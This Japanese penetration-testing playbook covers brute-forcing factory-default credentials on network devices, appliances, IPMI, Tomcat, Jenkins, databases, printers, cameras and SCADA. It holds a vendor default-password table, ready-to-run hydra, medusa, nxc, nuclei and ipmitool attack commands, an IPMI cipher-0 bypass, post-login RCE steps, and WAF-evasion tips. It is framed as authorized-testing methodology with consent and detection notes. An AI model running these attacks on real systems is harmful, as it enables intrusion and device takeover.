# 製品デフォルト認証情報・初期パスワードの試行

## このファイルの位置づけ

ネットワーク機器・ミドルウェア・管理コンソール・組込み機器の **製品出荷時のデフォルト認証情報** が運用後も変更されずに残っているケースを狙うための着眼点・手順を集約する。
ターゲット製品の特定は `01_Reconnaissance/` 配下（バナー・証明書 Issuer・Web ヘッダー・誤公開された設定ファイル）で済んでいる前提で、
**「製品が判明したら、まずデフォルト認証情報を当てるか辞書攻撃に行くか」を判断する** ためのファイル。

---

## デフォルト認証情報試行の全体像

### 着火条件

以下のいずれかが揃った時点で、辞書攻撃や CVE 探索より先にデフォルト認証情報を試す候補にする。

- 管理画面・ログインフォーム・Basic 認証プロンプトが見えており、**製品名・ベンダー名が特定できている**
- 証明書 Issuer / Server ヘッダー / favicon ハッシュ / HTML タイトル等から **アプライアンス・ミドルウェア製品名が判明** している
  （例：`Issuer: Fortinet` / `Server: Apache-Coyote/1.1`（Tomcat）/ `<title>JBoss EAP` / `<title>Jenkins` 等）
- ポートスキャンで **製品が暗黙のうちに分かるポート** が開いている
  （例：`623/udp` IPMI / `9100/tcp` プリンタ JetDirect / `554/tcp` RTSP（IP カメラ）/ `8443/tcp` 多くのアプライアンス管理）
- バージョン情報も取れているが **CVE が無い・パッチ適用済み** の場合に、認証回りに切り替える
- **製品の管理 Web UI** が `Welcome` / `Setup Wizard` / `Default login` のような画面を初期表示している（未初期化のまま放置）

### 環境前提

- 実行環境：テスター端末
- 必要なツール：
  - `hydra`（ペネトレ用 Linux ディストリ標準。`http-get-form` / `http-post-form` / `ssh` / `ftp` / `telnet` / `snmp` 等の多プロトコル辞書攻撃ツール）
  - `nxc`（NetExec の CLI ラッパー。SMB/WinRM/MSSQL/LDAP の認証テストを一括で行う、ペネトレ用 Linux ディストリ標準。詳細は `../05_Tools_Reference/Netexec.md`）
  - `medusa`（ペネトレ用 Linux ディストリ標準。`hydra` 代替。プロトコル別モジュールが豊富）
  - `curl`（標準搭載。Basic 認証 / Web フォームの 1 発確認）
  - `seclists`（ペネトレ用 Linux ディストリの大半でパッケージ済み。`/usr/share/seclists/Passwords/Default-Credentials/` 配下に製品別の `username:password` 形式リストが大量にある）
  - `nuclei`（別途インストール要、`go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`。`default-logins/` テンプレートが製品別に用意されている）
  - `snmpwalk` / `onesixtyone`（標準搭載。SNMP コミュニティ文字列（`public` / `private`）の確認）
  - `ipmitool`（別途インストール要、`apt install ipmitool`。IPMI のデフォルト認証 / cipher 0 確認）

オフライン代替：`seclists` パッケージが無い環境では事前にクローン済みのコピー（`https://github.com/danielmiessler/SecLists`）を持ち込む。`nuclei` のテンプレートも `nuclei-templates` リポジトリを事前同梱しておく。

### 観点・着眼点

**先に確認すること：**

- ロックアウトポリシー（試行回数で締め出される閾値・期間）→ `Account_Lockout_Recon.md` で事前確認してから試行する。**辞書攻撃の前にこの一手を入れないと、本番ユーザーが巻き込まれる**
- 対象がデフォルト認証情報を **拒絶する仕組み**（初回ログイン時にパスワード変更を強制するか、一度も使われていない管理アカウントが無効化されているか）。`admin/admin` 通過後に `Change password` 画面に飛ばされるのは健全な実装、ログインしたまま使えるなら「設定変更すらされていない」シグナル

**攻撃者の思考トレース：** デフォルト認証情報は **製品ごとの定石が決まっている**。乱数試行ではなく **「この製品ならこの組合せ」を直接当てる** のが正解。ベンダーのインストールガイドや出荷時マニュアルに記載されているもの（`admin/admin`・`root/calvin` 等）が候補リストの中心であり、汎用的な弱パスワード辞書（`rockyou.txt`）は二の手以降に回す。

**製品カテゴリ別の「最初に当てる組合せ」早見表：**

| 製品カテゴリ | 代表製品 | 着火を確認するシグナル | 最初に当てる組合せ（出荷時） |
|----------|---------|------------------|----------------------|
| ルータ / スイッチ管理 Web UI | Cisco / NETGEAR / TP-Link / Linksys / D-Link 等 | `Server: lighttpd` / GoAhead-Webs / Boa など組込み Web、管理ポート 80/443/8080 | `admin/admin` / `admin/[空]` / `cisco/cisco` / `root/[空]` / `[製品名]/[製品名]` |
| アプライアンス管理 Web UI | Fortinet / Citrix / Pulse / F5 / Palo Alto | 証明書 Issuer / SAN に製品名、HTML タイトルに製品名 | `admin/admin` / `admin/[製品シリアル]` / `maintenance/[空]` 等。CVE 既知の場合は CVE_Notes.md 経由 |
| ベース管理（IPMI / iLO / iDRAC / IMM） | HP iLO / Dell iDRAC / Supermicro IPMI / Lenovo IMM | `623/udp` 開放、`8080`/`443` で `Login` ページに製品名 | iLO: `Administrator/[8 文字シリアル]` 既定 / Dell iDRAC: `root/calvin` / Supermicro: `ADMIN/ADMIN` |
| サーブレットコンテナ管理画面 | Tomcat manager / Tomcat host-manager | `/manager/html` で 401 + `Server: Apache-Coyote` | `tomcat/tomcat` / `admin/admin` / `manager/manager` / `admin/[空]` |
| Java EE 管理コンソール | JBoss / WildFly / Weblogic | `/jmx-console/` / `/web-console/` / `/console/` / `:7001` の Weblogic | JBoss: `admin/admin` / Weblogic: `weblogic/weblogic` / `weblogic/welcome1` / `system/manager` |
| CI / CD | Jenkins / GitLab Omnibus | `/login` に Jenkins ロゴ、`X-Jenkins:` ヘッダー | Jenkins: 初期セットアップ未完了状態の `/script` 直叩き、または `admin/[インストール時自動生成]` / GitLab: `root/5iveL!fe`（旧版） |
| 監視 / 可視化 UI | Grafana / Kibana / Prometheus | `<title>Grafana` / `kbn-xsrf` ヘッダー / `Server: Werkzeug` 系 | Grafana: `admin/admin` （初回後にパスワード変更要求あり） / Kibana: 認証無し or `elastic/changeme`（旧 X-Pack デフォルト） |
| データベース | MSSQL / MySQL / PostgreSQL / MongoDB / Redis / ElasticSearch | 1433 / 3306 / 5432 / 27017 / 6379 / 9200 各ポート | MSSQL: `sa/[空]` / `sa/sa` / MySQL: `root/[空]` / `root/root` / PostgreSQL: `postgres/postgres` / MongoDB: 認証無し（27017 直結）/ Redis: 認証無し（6379 直結 → `INFO`）/ ElasticSearch: 認証無し（旧版） |
| プリンタ管理 Web UI | HP / Canon / Ricoh / Xerox / Brother | `9100/tcp` 開放、`80/443` で製品名タイトル | HP: `admin/[空]` / Canon: `7654321/[空]`（旧モデル）/ Xerox: `admin/1111` / 多くは `[空]` で入れる |
| IP カメラ・NVR | Hikvision / Dahua / Axis / 各 OEM | `554/tcp` RTSP 開放、`80` で `<title>WEB SERVICE` 等 | Hikvision: `admin/12345`（古典）/ Dahua: `admin/admin` / Axis: `root/pass`（初期化要）/ ONVIF: `admin/[空]` |
| VPN アプライアンス管理 | OpenVPN AS / SoftEther / WireGuard 管理 UI | 943/443 で管理ポータル | OpenVPN AS: `openvpn/[インストール時生成]` / 各ベンダーは `admin/admin` を試す |
| KVM-over-IP / Console Server | Lantronix / Avocent / Raritan | `5900/5901` VNC、`23/tcp` Telnet | Lantronix: `Admin/PASS`（大文字注意）/ Raritan: `admin/raritan` / VNC: 認証無し（パスフレーズ未設定） |
| 産業系 / SCADA / PLC | Siemens / Schneider / Rockwell | `102/tcp` S7 / `502/tcp` Modbus / `44818` EthernetIP | 多くは認証機構自体が無い。あっても `ALL/12345` 等。**業務影響大。試行可否は事前合意必須** |
| メール（管理 / IMAP/POP）| Postfix admin / Roundcube / iRedMail / cPanel | 80/443 で管理画面 | iRedMail: `postmaster@[DOMAIN]/[インストール時設定]` / cPanel: `root/[空]`、`whostmgr` |
| ストレージ NAS | Synology / QNAP / Buffalo / Netgear ReadyNAS | `5000/5001`（Synology）/ `8080/443`（QNAP） | Synology: `admin/[空]` / QNAP: `admin/admin` |

**SecLists の Default-Credentials/ の使い方：**

`/usr/share/seclists/Passwords/Default-Credentials/` 配下には製品別 `username:password` 形式のリストが用意されている（ベンダー出荷時の組合せを集めたもの）。代表例：

| ファイル | 用途 |
|---------|------|
| `default-passwords.csv` | 製品名・モデル名・ユーザー・パスワードを CSV で網羅。grep で製品名を絞り込んで抜き出す |
| `tomcat-betterdefaultpasslist.txt` | Tomcat manager 専用 |
| `Routers/scada-pass.csv` | SCADA / PLC 系 |
| `Common-Credentials/best110.txt` | デフォルト判明後の派生パターン（数字・記号付け足し）の補完 |

```bash
# [Attacker] 製品名で grep して候補組合せを抽出
grep -i "tomcat" /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv   # [Attacker]

# user / pass を分離して 2 ファイルにする
grep -i "tomcat" /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv \
  | awk -F',' '{print $3}' | sort -u > tomcat_users.txt   # [Attacker]
grep -i "tomcat" /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv \
  | awk -F',' '{print $4}' | sort -u > tomcat_pass.txt   # [Attacker]
```

**何が出たら次に何をするか：**

| 観測される出力 | 示唆 | 次のアクション |
|------------|-----|------------|
| `admin/admin` で初回ログイン後にパスワード変更画面が出る | 健全な初期セットアップフロー。** 機能としてはここで止まっているだけで認証情報は変更されていない** | パスワード変更画面の挙動を確認、変更を強要されるなら強引に進めず別経路へ |
| ログイン成功後に `Change password` を出さずそのまま管理機能が使える | 出荷状態のまま放置 | 管理機能の中で何ができるかを列挙（ファイル読込・コマンド実行・ユーザー追加） |
| `admin/admin` が通らないが `tomcat/tomcat` 等の製品由来組合せが通る | 出荷時候補を変更しただけで「次に試される候補」を選んでいる | 同じ思想で `[製品名]/[製品名]` `[製品名]/[製品名]123` 等を試す |
| Basic 認証で `WWW-Authenticate: Basic realm="[製品名]"` | realm 名にそのまま製品名 | realm 名を製品判定に使い、その製品の出荷組合せに進む |
| ログイン成功するが管理機能が空 / `Permission denied` 連発 | 認証は通ったが認可が低い | 別のデフォルトアカウント（`manager` / `monitor` 等）を試す |
| ログインフォームが CAPTCHA 付き | 自動化拒否 | Burp で 1 リクエストずつ手動、もしくは画面を直接観察した上で必須な数発のみに絞る |

---

## 手順

### Step 1：製品特定済みの状態で「最初の 1 発」を `curl` で当てる

辞書攻撃を回す前に **最も可能性の高い 1 ～ 3 組合せだけ手で試す**。それで通れば辞書攻撃は不要、通らなければ後段の自動化に進む。

```bash
# [Attacker] Basic 認証の 1 発確認（401 か 200 か / 200 ならログイン成立）
curl -s -o /dev/null -w "%{http_code}\n" -u admin:admin http://[TARGET]/manager/html   # [Attacker]
curl -s -o /dev/null -w "%{http_code}\n" -u tomcat:tomcat http://[TARGET]/manager/html   # [Attacker]

# [Attacker] フォーム POST の 1 発確認（HTTP Body の差分でログイン成否を判別）
curl -s -X POST http://[TARGET]/login.php \
  -d "username=admin&password=admin" -i | head -20   # [Attacker]
# Set-Cookie が新規発行 / Location: が dashboard 系に飛ぶ → ログイン成功
# 同じログインページが返る / "Invalid" 文言 → 失敗
```

### Step 2：`hydra` で多プロトコル辞書攻撃

#### Basic 認証 / Digest 認証

```bash
# [Attacker] HTTP Basic 認証
hydra -L users.txt -P pass.txt -e nsr [TARGET] http-get /manager/html   # [Attacker]
# -e nsr : null（空）/ same as login（user と同じ）/ reverse（user の逆順）も自動試行
# -L: ユーザーリスト  -l: 単一ユーザー
# -P: パスワードリスト -p: 単一パスワード

# 同じく Basic 認証だが POST 用エンドポイント
hydra -L users.txt -P pass.txt [TARGET] http-post /admin/login   # [Attacker]
```

#### HTTP フォームログイン（http-post-form）

`http-post-form` の構文：`/[PATH]:[POST_BODY]:[FAIL_PATTERN]`

```bash
# [Attacker] 失敗時に "Invalid credentials" を含むレスポンスが返るログインフォーム
hydra -L users.txt -P pass.txt [TARGET] http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"   # [Attacker]
# ^USER^ ^PASS^ がユーザー・パスワードに置換される
# 末尾の "Invalid credentials" は失敗判定文字列。これが本文に含まれない → 成功とみなす

# F=「失敗判定」/ S=「成功判定」を明示する場合
hydra -L users.txt -P pass.txt [TARGET] http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Login failed:S=302"   # [Attacker]

# Cookie 付きフォーム（CSRF トークン付きフォームの簡易対応）
hydra -L users.txt -P pass.txt [TARGET] http-post-form \
  "/login:user=^USER^&pass=^PASS^&token=[CSRF_TOKEN]:F=invalid:H=Cookie\: session=[SESSION_ID]"   # [Attacker]
# H= で任意ヘッダーを追加
```

`http-post-form` の **失敗判定文字列を間違えると全部成功扱いになる** ため、Step 1 で一度手動ログインを通して **本物の失敗レスポンスに含まれる固有文字列** を選ぶ。

#### SSH / Telnet / FTP

```bash
# [Attacker] SSH（CVE-2018-15473 等で列挙したユーザーリストを使用）
hydra -L users.txt -P pass.txt -t 4 [TARGET] ssh   # [Attacker]
# -t 4 : 並列スレッド数。SSH は 4 程度に抑える（fail2ban を踏まないため）

# [Attacker] Telnet
hydra -L users.txt -P pass.txt [TARGET] telnet   # [Attacker]

# [Attacker] FTP
hydra -L users.txt -P pass.txt [TARGET] ftp   # [Attacker]
```

#### SNMP コミュニティ文字列

```bash
# [Attacker] SNMP v1/v2c のコミュニティ文字列を辞書で当てる
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt [TARGET] snmp   # [Attacker]

# [Attacker] onesixtyone（軽量・高速）
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt [TARGET]   # [Attacker]

# 通った組合せで snmpwalk
snmpwalk -v2c -c [COMMUNITY] [TARGET]   # [Attacker]
# OID 1.3.6.1.2.1.1（system 情報）/ 1.3.6.1.4.1.77.1.2.25（Windows ユーザー一覧）等
```

#### IPMI（Baseboard Management）

```bash
# [Attacker] cipher 0（認証バイパス。CVE-2013-4786 系の IPMI 2.0 仕様欠陥）
ipmitool -I lanplus -C 0 -H [TARGET] -U admin -P [ANY_PASSWORD] user list   # [Attacker]
# cipher 0 が有効なら任意パスワードで認証が通る

# [Attacker] 通常のデフォルト認証情報
ipmitool -I lanplus -H [TARGET] -U admin -P admin user list   # [Attacker]
ipmitool -I lanplus -H [TARGET] -U root -P calvin user list   # [Attacker]    # Dell iDRAC 既定

# [Attacker] パスワードハッシュの抽出（IPMI 2.0 RAKP 認証情報リーク）
hydra -L users.txt -P pass.txt [TARGET] ipmi   # [Attacker]
```

### Step 3：`nxc` で SMB / WinRM / MSSQL の管理者デフォルト

```bash
# [Attacker] MSSQL デフォルトアカウント（sa/sa, sa/[空], sa/Password1 等）
nxc mssql [TARGET] -u sa -p ''   # [Attacker]
nxc mssql [TARGET] -u sa -p 'sa'   # [Attacker]
nxc mssql [TARGET] -u sa -p 'Password1'   # [Attacker]

# [Attacker] SMB のデフォルト管理者
nxc smb [TARGET] -u Administrator -p ''   # [Attacker]
nxc smb [TARGET] -u Administrator -p 'Administrator'   # [Attacker]

# [Attacker] パスワードリストとの組合せ（多製品共通辞書）
nxc smb [TARGET] -u admin -p /usr/share/seclists/Passwords/Default-Credentials/best110.txt --continue-on-success   # [Attacker]
```

詳細：`../05_Tools_Reference/Netexec.md`

### Step 4：`medusa`（hydra 代替）

```bash
# [Attacker] medusa は -M でモジュール指定、-h ホスト、-U/-u ユーザー、-P/-p パスワード
medusa -h [TARGET] -U users.txt -P pass.txt -M http -m DIR:/manager/html -T 4   # [Attacker]
medusa -h [TARGET] -U users.txt -P pass.txt -M ssh -t 4   # [Attacker]
```

`hydra` がモジュール非対応のプロトコル（`afp` / `vnc` の特定方式 / `pcanywhere` 等）を扱えるのが `medusa` の利点。

### Step 5：`nuclei` のデフォルト認証情報テンプレート（一括チェック）

```bash
# [Attacker] default-logins/ カテゴリ（製品別の組合せ自動試行）
nuclei -t default-logins/ -u https://[TARGET]   # [Attacker]

# 範囲を絞る
nuclei -t default-logins/jenkins/ -t default-logins/grafana/ -t default-logins/tomcat/ -u https://[TARGET]   # [Attacker]
```

**シグナルと次のアクション：**

| nuclei 出力 | 次のアクション |
|-----------|--------------|
| `tomcat-default-login` ヒット | `/manager/html` から WAR デプロイ → RCE |
| `jenkins-default-login` ヒット | `/script` で Groovy console から RCE（管理者権限のみ）|
| `grafana-default-credential` ヒット | データソース設定の閲覧、`Server-Side Request Forgery` 系の悪用余地確認 |
| `weblogic-default-login` ヒット | T3 / IIOP プロトコルからのデシリアライズ系 CVE 候補に進む |

### Step 6：通った後にやること（カテゴリ別の即時アクション）

| 製品 | 認証通過後の即時アクション |
|------|------------------------|
| Tomcat manager | `/manager/html` → Deploy で WAR ファイルアップロード → コンテキスト URL アクセスで RCE（msfvenom で生成した jsp shell を WAR 化） |
| JBoss / Weblogic | JMX-Console / Admin Console から MBean 操作 → デプロイ系で RCE |
| Jenkins | `/script` で Groovy `println "id".execute().text` を実行 → SYSTEM / jenkins ユーザーで RCE |
| Grafana | データソース（MySQL/PostgreSQL/MSSQL）の接続情報を閲覧 → 別 DB への横展開 |
| Kibana / ElasticSearch | `/_cat/indices` で全インデックス、`_search` で内容取得（クレデンシャル混入有無） |
| MSSQL `sa` 通過 | `xp_cmdshell` 有効化で OS コマンド実行 → `../02_Initial_Access/MSSQL_Exploitation.md` |
| MongoDB / Redis 認証無し | `db.getCollectionNames()` / `KEYS *` で全データ列挙、設定ファイル / セッション / 認証情報の混入確認 |
| ルータ / スイッチ管理 | 設定 export → 平文・難読化された無線 PSK・SNMP コミュニティ・他機器のクレデンシャルを取得 |
| IPMI 通過 | 仮想メディアでブート ISO マウント → ホスト OS の単独パスワード変更 / SOL（Serial-over-LAN）でコンソールアクセス（**業務影響大、本番では事前合意必須**） |
| プリンタ | アドレス帳（メール / SMB / LDAP 認証情報の保存）取得、PostScript / PJL 経由のファイル読込 |
| IP カメラ | RTSP ストリーム取得、ONVIF API でデバイス情報、ファームウェアダンプ |

---

## 刺さらなかったとき

| 観測される症状 | 推定原因 | 対処 |
|--------------|---------|------|
| 全組合せが `401` / `403` で返る | 出荷時組合せが変更されている / IP 制限 ACL がある | デフォルト試行を打ち切り、CVE / 既知 RCE / 別経路（パスワードリセット手順の悪用 等）に切替 |
| 数回失敗後にレスポンスが極端に遅くなる | tarpit / fail2ban 系のレート制限 | 試行間隔を入れる（`hydra -W 5` で 5 秒待機）、Step 1 の手動 1 発に戻る |
| ログイン成功するが管理機能が空 | 認証は通ったが認可が低い | `manager-gui` / `manager-script` / `monitor` 等の別ロール組合せを試す |
| `429 Too Many Requests` / WAF カスタム 403 | WAF / Reverse Proxy がパス・ヘッダーで遮断 | UA を一般ブラウザに偽装（`hydra -e nsr -u -m "User-Agent: Mozilla/5.0"`）、IP を変える |
| アカウントが「ロック」される表示 | ロックアウト閾値超え | `Account_Lockout_Recon.md` でポリシーを事前確認しなおし、試行設計を作り直す |
| `STATUS_LOGON_FAILURE` が全 SMB 試行で返る | NTLM 無効化 / Kerberos 強制 | nxc に `-k` を付けて Kerberos で試す、もしくは別経路へ |
| 「初回ログイン時にパスワード変更必須」画面に飛ばされる | デフォルト認証情報は通っているが「ログインのみ」状態 | 機能としてはここで止まっているケース。**強引に変更すると環境を壊す**ため、認証情報が通った事実だけを記録して別経路へ |

---

## 注意点・落とし穴

> **[HIGH IMPACT]** デフォルト認証情報試行・辞書攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（ロックアウトポリシーが厳しい環境では正規ユーザー巻き込みでサービス停止）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む（試行のみなら通常該当なし。ただし通った後にデプロイ・xp_cmdshell 有効化等を行うと該当）
> - [x] SIEM/EDR で確実に検知される（Windows: Event ID 4625 大量発生 / Linux: `auth.log` の `Failed password` 連発 / WAF ログのログインエンドポイント連続失敗）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

- **デフォルト認証情報試行の前にロックアウトポリシーを必ず確認する。** 確認手段は `Account_Lockout_Recon.md`。閾値が分からない状態で 5 個以上の組合せを並列で投げると、AD 環境では本物のユーザーまで巻き添えで締め出される
- **「製品が判明していない状態で `rockyou.txt` を投げる」は時間の無駄。** デフォルト試行は **製品名が分かっている前提でこそ命中率が高い**。判明していない場合は `01_Reconnaissance/` に戻ってバナー / 証明書 / favicon / HTML タイトル / Cookie 名で製品特定してから戻る
- **`http-post-form` の失敗判定文字列を 1 度も検証せずに辞書を流すと全件成功扱いになる。** 必ず Step 1 で正規の失敗レスポンスを 1 回観察してから F= に渡す
- **IPMI cipher 0 は認証バイパス可能だが業務影響極大** — マザーボード経由でブート構成・電源・コンソールに無制限アクセスできる。試行は通信到達性確認に留め、設定変更は事前合意必須
- **データベースの認証無し露出（MongoDB / Redis / ElasticSearch）に書き込みクエリを発行しない。** `INFO` / 読み取り系のみで実態把握する
- **SCADA / PLC / 産業系プロトコル（102/502/44818）に辞書攻撃を投げない。** プロトコル仕様上、想定外コマンドで装置側がフェイルセーフ停止することがある。**業務影響極大、原則として事前合意の対象**
- **「通った認証情報」を他サービスで試すパスワード使い回し確認も同じ慎重さが必要。** スプレー対象を広げると累積失敗数も増える。`Account_Lockout_Recon.md` の閾値を共有して 1 アカウントあたりの試行数を計算する
- **デフォルト認証情報で得たアクセスは「変更されていない」シグナル**。同じ管理者がほかの機器も初期状態で運用している可能性が高い。横展開時の優先順位を上げる
- **プリンタ・IP カメラの管理画面はログ容量が小さく、過去の証跡を上書きしやすい。** 列挙頻度を下げ、必要最小限の操作に留める

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。特に SCADA / IPMI / VPN アプライアンス管理画面 / 業務基幹アプリ管理画面はパスワードロックアウトと業務停止リスクで厳格な確認対象
- **想定される SIEM / EDR 検知**:
  - Windows: Event ID 4625（ログオン失敗）大量発生 / Event ID 4740（アカウントロックアウト）
  - Linux: `/var/log/auth.log` の `Failed password` 連発、`pam_unix(sshd:auth): authentication failure`
  - Web 製品: アプリログ・WAF ログのログインエンドポイント連続失敗、IDS のシグネチャ（`Hydra` UA・`User-Agent: Mozilla/4.0`）
- **業務影響リスク**: アカウントロックアウト → 正規ユーザー締め出し / SCADA・IPMI に対する誤コマンドでフェイルセーフ停止
- **原状回復必須項目**: ✅ 試行ログ（テスター側）の暗号化保管・案件終了時破棄 / ✅ 通過後に追加したアカウント・設定変更（WAR デプロイ・xp_cmdshell 有効化等）の元戻し
- **取得情報の取扱**: 通過したクレデンシャルは暗号化保管、案件終了時に破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：管理ポートの発見・バナーグラブ → `../01_Reconnaissance/Network_Scanning.md`
- 前：管理画面・ログインフォーム・フレームワーク特定 → `../01_Reconnaissance/Web_Enumeration.md`
- 前：証明書 Issuer / SAN からのアプライアンス製品名推定 → `../01_Reconnaissance/TLS_Audit.md`
- 前：管理コンソール誤公開・Tomcat manager / JBoss / Spring Actuator / Jenkins の発見 → `../01_Reconnaissance/Exposed_Files.md`
- 前：SSH ユーザー列挙の結果で `-L users.txt` のリストを構築 → `./SSH.md`
- 前：試行前にロックアウト閾値を必ず確認 → `./Account_Lockout_Recon.md`
- 後：SSH に通った認証情報での本格的アクセス → `./SSH.md`
- 後：FTP に通った認証情報での本格的アクセス → `./FTP.md`
- 後：WinRM に通った認証情報での本格的アクセス → `./Protocol_Exploitation.md`
- 後：`sa` 通過後の `xp_cmdshell` / ユーザーなりすまし → `./MSSQL_Exploitation.md`
- 後：通過した管理画面から保存されている他システムの認証情報を抽出 → `./Credential_Discovery.md`
- 後：SMB / WinRM / MSSQL のスプレー詳細 → `../05_Tools_Reference/Netexec.md`
- 後：製品名・バージョンが判明している場合の CVE 検索 → `../05_Tools_Reference/Searchsploit.md`
- 後：デフォルト認証情報が変更済みで認証が突破できない場合の代替経路（製品判明時点でベンダー別既知 CVE へ） → `./Edge_Appliance_CVEs.md`
